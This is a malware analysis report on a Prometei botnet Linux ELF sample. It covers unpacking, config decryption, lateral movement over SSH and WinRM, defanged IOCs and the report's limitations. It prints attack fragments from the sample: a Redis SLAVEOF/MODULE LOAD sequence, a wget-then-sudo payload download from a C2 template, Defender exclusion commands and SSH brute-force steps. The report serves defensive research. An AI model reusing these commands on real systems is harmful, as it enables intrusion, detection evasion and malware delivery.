---
title: "Malware Analysis: Prometei (ELF · elf · 3b4cad8a)"
published: 2026-11-03
draft: false
description: "Malicious (high confidence): Prometei · botnet/loader/downloader · difficulty medium · dynamic sandbox + static decompilation"
tags: ["Prometei", "botnet", "loader", "downloader", "ELF"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-03-Prometei-3b4cad8a"
---

> [!WARNING]
> **Verdict: Malicious** · Family **Prometei** · Confidence **high**
> 
> Aliases: Prometei botnet, UPlugPlay, Prometei miner
> 
> After unpacking, decompilation reveals full lateral-movement and remote-control logic: SSH weak-password brute force, WinRM/WinRS remote command execution, SMB/WinRM component deployment, Redis MODULE LOAD exploitation, and HTTP callback with payload download; real execution in the isolated sandbox showed UPX self-extraction, configuration/component path probing, and a pgrep netwalker single-instance check.

## Overview

| Item | Content |
|:--|:--|
| Family | **Prometei** · aliases Prometei botnet, UPlugPlay, Prometei miner |
| Confidence | **high** |
| Behavior class | botnet · loader · downloader |
| Difficulty | medium |
| First seen | 2026-10-31 11:40:19 |
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/3b4cad8aa3ebb4d62394af09991dd06a5ec2f5b62bfe01fb324558a3457408e4/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">UPX self-extraction</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027.002</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Decrypt config</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="134" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="134" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Single-instance check</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1057</text>
<rect x="586" y="123" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="138" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">dynamic</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">SSH weak-password lateral movement</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1110.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">WinRM remote execution</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1021.006</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identification

| Item | Value |
|:--|:--|
| SHA-256 | `3b4cad8aa3ebb4d62394af09991dd06a5ec2f5b62bfe01fb324558a3457408e4` |
| MD5 | _not recorded_ |
| Size | 1,773,480 bytes (1.7 MB) |
| Type | ELF · `elf` |

## Behavior analysis

**12** behaviors in total, each backed by evidence; **11** statically recoverable, **1** obtained through dynamic analysis.

### 1. UPX self-extraction

`T1027.002` · Confidence **high** · static

The sample is packed with UPX 4.24 and its entry is the decompression stub; at runtime it restores a roughly 4.2 MB body via mmap/mprotect and jumps to the OEP.

> **Evidence**: packed ELF entry 0xE04CA8; whole-file entropy 7.94; syscall tracing shows mmap/mprotect decompression at 0x400000/0x401000
> 
> **Source**: `ref:1116d7d71f` · `ref:89dc5f332c` · `ev-000060` · `ref:58d0c60c0f`

### 2. Decrypt config

`T1140` · Confidence **high** · static

The main function reads walker.dat/walker.ini, decrypts with the hardcoded key Qwdrosd3grdsfFsz, and parses a JSON config containing config/id/enckey/ParentHostname/ip/ParentIP.

> **Evidence**: FUN_004431f7 @0x4431f7 calls FUN_0042133c("Qwdrosd3grdsfFsz",...); JSON keys @0x36041/0x361a4/0x362f5/0x3644e
> 
> **Source**: `ev-000015` · `ev-000019` · `ref:58d0c60c0f` · `ev-000060`

### 3. Single-instance check

`T1057` · Confidence **high** · dynamic

After startup it executes /bin/sh -c "pgrep netwalker"; if a process with that name already exists it does not start again, avoiding duplicate residency.

> **Evidence**: dynamic trace: execve("/bin/sh", ["sh","-c","pgrep netwalker"])
> 
> **Source**: `ref:58d0c60c0f`

### 4. SSH weak-password lateral movement

`T1110.001` · Confidence **high** · static

It embeds a libssh client and a roughly hundred-entry password dictionary, connects to 22/tcp and tries ssh_userauth_password; on success it runs uname -a, hostname, uname -m&&pkill upnpsetup and delivers the payload.

> **Evidence**: FUN_0043e9ec @0x43e9ec uses aes128-ctr; password table @0x31bed0; format string "%s ssh %s:22" @0x31cb34
> 
> **Source**: `ev-000017` · `ev-000060` · `ref:522c329945`

### 5. WinRM remote execution

`T1021.006` · Confidence **high** · static

It uses WinRS SOAP requests (Negotiate/NTLM) to hxxp://<host>:5985/wsman to execute PowerShell commands in remote cmd.exe.

> **Evidence**: SOAP template @0x319c2e/0x31a3bf; WINRS_SKIP_CMD_SHELL/WINRS_CONSOLEMODE_STDIN; FUN_0043cfd3 @0x43cfd3
> 
> **Source**: `ev-000018` · `ref:522c329945` · `ev-000060`

### 6. Deploy Windows components

`T1105` · Confidence **high** · static

Via WinRM/SMB it writes zsvc.exe, winhlpx64.exe, mshlpda32.dll, ssldata2.dll, uplugplay, netwalker, updates1.7z/2.7z, 7z.exe/7z.dll into C:\Windows and executes winhlpx64.exe.

> **Evidence**: FUN_0043cfd3 uploads to C:\Windows\...; path strings @0x31c473-0x31c536
> 
> **Source**: `ev-000018` · `ev-000060`

### 7. Add Defender exclusions

`T1562.001` · Confidence **high** · static

It uses the PowerShell Add-MpPreference -ExclusionPath command to add C:\Windows and C:\Windows\Dell to Defender exclusions, evading detection.

> **Evidence**: 0x43d36a/0x43d43e -> Add-MpPreference -ExclusionPath "C:\Windows"/"C:\Windows\Dell"
> 
> **Source**: `ev-000018` · `ev-000060`

### 8. Redis module load

`T1210` · Confidence **high** · static

It sends SLAVEOF and CONFIG SET dir /tmp/, CONFIG SET dbfilename plugin1.so to Redis on 6379/tcp, then MODULE LOAD /tmp/plugin1.so to achieve unauthenticated command execution.

> **Evidence**: strings @0x31cb75-0x31cbeb; xref 0x448ad9 -> SLAVEOF %s 16379
> 
> **Source**: `ev-000060` · `ev-000019` · `ref:522c329945`

### 9. Download and run payload

`T1105` · Confidence **high** · static

It builds wget -nc hxxp://<parent>/k.php?a=<arch>,<id> -O ./upnpsetup, runs chmod 777 followed by sudo ./upnpsetup, and cleans up old processes and temporary files.

> **Evidence**: 0x44089b -> wget .../k.php?a=; 0x31c6e9 chmod 777 ./upnpsetup; 0x31c6ff sudo ./upnpsetup
> 
> **Source**: `ev-000060` · `ref:522c329945`

### 10. HTTP callback to C2

`T1071.001` · Confidence **medium** · static

It reports check-in/heartbeat as hxxp://<ParentHost>/k.php?good=<id>&i=<ip>, with the hostname and IP coming from the encrypted config or the parent node.

> **Evidence**: 0x442fc3 -> hxxp://%s/k.php?good=%s&i=%s
> 
> **Source**: `ev-000060` · `ev-000019` · `ref:522c329945`

### 11. Reside in /usr/sbin

`T1036.005` · Confidence **high** · static

It copies itself/components to /usr/sbin/netwalker, /usr/sbin/uplugplay, /etc/uplugplay, /etc/CommId, chmod 777, and restarts from those paths, masquerading as system programs.

> **Evidence**: /usr/sbin/netwalker @0x31c8be; /etc/CommId @0x40db08; chmod 777 netwalker @0x31c8f0
> 
> **Source**: `ev-000060` · `ev-000016` · `ref:522c329945`

### 12. Collect host fingerprint

`T1082` · Confidence **high** · static

Over the SSH session it runs uname -a, hostname, uname -m to identify Darwin/Linux and the CPU architecture so it can select the matching payload.

> **Evidence**: FUN_0043e9ec @0x43e9ec runs uname -a / hostname / uname -m&&pkill upnpsetup
> 
> **Source**: `ev-000017` · `ref:522c329945`


## IOC (defanged)

### Network

:::caution
**Pending dynamic verification**: the addresses above come from static analysis; no successful connection or session was observed in the network-isolated analysis environment, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://<ParentHost>/k.php?good=<id>&i=<ip>` | 80 | c2 | static | ⏳ not observed |
| http | `hxxp://<ParentHost>/k.php?a=<arch>,<id>` | 80 | download | static | ⏳ not observed |

### Host

**Drop paths**

- `/usr/sbin/uplugplay`
- `/usr/sbin/netwalker`
- `/usr/sbin/walker.ini`
- `/etc/uplugplay`
- `/etc/CommId`
- `/tmp/plugin1.so`
- `/tmp/upnpsetup`
- `.cpass`
- `walker.dat`
- `walker.ini`
- `updatecheckerd.dat`
- `desktop.dat`
- `uplugplay_new`
- `sqhost.exe`
- `rdpcIip.exe`
- `7z.exe`
- `7z.dll`
- `updates1.7z`
- `updates2.7z`
- `C:\Windows\zsvc.exe`
- `C:\Windows\winhlpx64.exe`
- `C:\Windows\mshlpda32.dll`
- `C:\Windows\ssldata2.dll`
- `C:\Windows\uplugplay`
- `C:\Windows\netwalker`
- `C:\Windows\updates1.7z`
- `C:\Windows\updates2.7z`
- `C:\Windows\7z.exe`
- `C:\Windows\7z.dll`
- `C:\Windows\sqhost.exe`
- `C:\Windows\Dell`

### Config

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `ParentHostname / ParentIP, from the JSON config in walker.dat/walker.ini` | yes | dynamic |
| `c2_url` | `hxxp://<ParentHost>/k.php?good=<id>&i=<ip>` | yes | static |
| `payload_url` | `hxxp://<ParentHost>/k.php?a=<arch>,<id>` | yes | static |
| `node_id` | `config.id` | yes | dynamic |
| `enckey` | `config.enckey (per-node key)` | yes | dynamic |
| `encryption_algo` | `config decryption AES-128 (hardcoded key Qwdrosd3grdsfFsz); SSH session aes128-ctr` | no | static |
| `install_path` | `/usr/sbin/netwalker, /usr/sbin/uplugplay, /etc/CommId, C:\Windows\...` | yes | static |
| `version` | `v4.55` | no | static |

## Must not claim

:::important
The following conclusions are **prone to misjudgment**; take care when citing this report.

- No file encryption, ransom notes, or extension-tampering logic were found; it should not be classified as ransomware. AES/OpenSSL constants are used for config decryption and SSH/WinRM encrypted communication.
- This file is a Linux ELF; although it contains Windows component deployment and PowerShell commands, that does not prove it runs directly on Windows — the Windows-side behavior is performed by the deployed components.
- No real C2 domain/IP was obtained: the config is delivered by walker.dat or a parent node, static analysis yields only URL templates, and 8.8.8[.]8 or 127.0.0[.]1 must not be treated as C2.
- This sample should not be treated as a pure miner: this module contains no mining-pool/wallet strings; mining capability may be provided by later downloaded components.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Unpacking | yes (stage2 `3a69569f3152708d11d38e958094d7041a0ea5d54a50c39447886fccef99c1b5`) |

**Limitations and pending verification**

1. The sample is a UPX-packed statically linked ELF that remains stripped after unpacking; function names rely on decompilation inference.
2. The actual C2 host/IP, node id, and enckey were not obtained from walker.dat/walker.ini (the files do not exist in the sandbox); the c2 field is a static URL template, pending_dynamic_verify=true.
3. Dynamic execution timed out after 25 seconds and no network egress or successful lateral movement was observed; lateral-movement capability comes from static decompilation and strings and was not verified on a real network.
4. Windows-side registry/service persistence (such as the UPlugPlay service, MachineKeyId/CommId registry entries) is implemented by the deployed Windows components; this ELF contains no corresponding code, so they are not listed in host_iocs.registry/services.
5. No embedded Windows components (zsvc.exe/winhlpx64.exe, etc.) were extracted; stage2 is empty.

## Evidence index

<details>
<summary>Expand 12 tool evidence records</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ref:1116d7d71f` | ELF structure parsing | original sample ELF structure: 3 PT_LOAD, no section table/symbols, entry 0xE04CA8 in the UPX stub |
| `ref:89dc5f332c` | scan.entropy | whole-file entropy 7.94, indicating packing/encryption |
| `ev-000060` | evidence.record | UPX 4.24 unpacking result (sha256 3a69569f...) plus summary of key strings/cross-references |
| `ref:a81fee2589` | ELF structure parsing | unpacked ELF structure: 4 PT_LOAD, .text 3.2 MB, statically linked stripped |
| `ev-000004` | cryptographic constant identification | AES S-box constants @0x40c2c0 |
| `ev-000014` | string extraction | 13684 ASCII strings extracted after unpacking |
| `ev-000015` | decompile.ghidra | main function decompilation: reads walker.dat, key Qwdrosd3grdsfFsz, config parsing |
| `ev-000016` | decompile.ghidra | install/argument handling functions: /proc/self/exe, /etc/CommId, .cpass |
| `ev-000017` | decompile.ghidra | SSH module: libssh aes128-ctr, uname -a, hostname, uname -m |
| `ev-000018` | decompile.ghidra | WinRM module: Add-MpPreference, C:\Windows component deployment, PowerShell execution |
| `ev-000019` | decompile.ghidra | main function decompilation (including C2/propagation logic references) |
| `ref:58d0c60c0f` | dyn.trace | isolated sandbox syscall tracing: UPX decompression, config/component path probing, pgrep netwalker; 25-second timeout |

</details>

---

_This report's sample is not public; IOCs are defanged and provided for security research only._
